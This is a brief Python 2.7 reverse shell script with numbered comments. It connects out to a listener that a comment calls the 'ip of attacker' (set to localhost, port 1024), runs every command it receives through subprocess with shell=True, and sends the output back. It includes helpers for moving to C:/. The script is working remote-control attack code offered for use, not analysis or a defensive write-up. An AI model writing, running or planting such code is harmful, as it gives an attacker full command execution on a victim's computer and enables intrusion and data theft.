#
# Script VALIDATION : YES
# python27
# Update : TODO: moving directory

# 1 - import right module
import socket
import subprocess
import os
import sys

# 2 - create UDP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 3 - connect the socket to the port where the server listing (ip of attacker, public ip works)
server_conf = 'localhost', 1024

# 4 - connect socket to server_conf
sock.connect(server_conf)

# 5 - send first message
connected = "Connected"
sock.send(connected)

# 6 - recv message from server
# interpret it as command line
while True:

      rcv_command = sock.recv(3096)
      op = subprocess.Popen(rcv_command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

      # 7 print rcv_command for test
      print (rcv_command)
      print (op.pid)
      print (op.wait())

      # Go to C:\
      if rcv_command == "root":
            os.chdir("c:/")
            sock.sendall("Change Directory to C:/")

      # Change Directory
      if rcv_command == "chg":
            os.chdir(os.getcwd() + "/")
            sock.sendall("[!] actual path:" + os.getcwd())

      # if rcv_command ==  "cd"

      # Command not recognize
      if op.wait() == 0:
            output_cmd = (op.stdout.read())
            sock.sendall(output_cmd)
      else:
            sock.sendall("[!] Error Command")





